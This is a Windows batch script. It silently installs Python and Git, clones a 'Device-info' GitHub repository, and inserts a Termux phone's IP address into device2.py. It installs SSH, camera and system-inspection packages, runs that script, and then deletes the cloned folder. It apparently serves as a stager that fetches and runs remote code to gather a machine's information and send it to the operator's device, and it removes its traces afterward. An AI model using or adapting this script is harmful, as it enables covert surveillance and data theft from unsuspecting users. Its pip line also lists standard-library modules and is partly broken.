@echo off
REM Set the folder name for the cloned repository
set "CLONE_DIR=Device-info"

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Installing Python...
    REM Download and install Python silently
    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe -OutFile python_installer.exe"
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
)

REM Check if Git is installed
git --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Git not found. Installing Git...
    REM Download and install Git silently
    powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.30.0.windows.1/Git-2.30.0-64-bit.exe -OutFile git_installer.exe"
    start /wait git_installer.exe /verysilent
    del git_installer.exe
)

REM Clone the GitHub repository if it doesn't already exist
REM Replace the URL with your actual GitHub repository URL
if not exist "%CLONE_DIR%" (
    git clone https://github.com/uchihasosuke/Device-info.git "%CLONE_DIR%"
)

REM Change directory to the cloned repository
cd "%CLONE_DIR%"

REM Set the Termux IP address (replace with your Termux IP)
set "TERMUX_IP=192.168.x.x"

REM Replace the placeholder IP in device2.py with the Termux IP
powershell -Command "(Get-Content device2.py).replace('TERMUX_IP = \"192.168.x.x\"', 'TERMUX_IP = \"%TERMUX_IP%\"') | Set-Content device2.py"

REM Install required Python packages
pip install platform socket uuid opencv-python datetime paramiko re psutil getpass

REM Run the Python script
python device2.py

REM Go back to the parent directory
cd ..

REM Delete the cloned repository folder
rd /s /q "%CLONE_DIR%"

exit
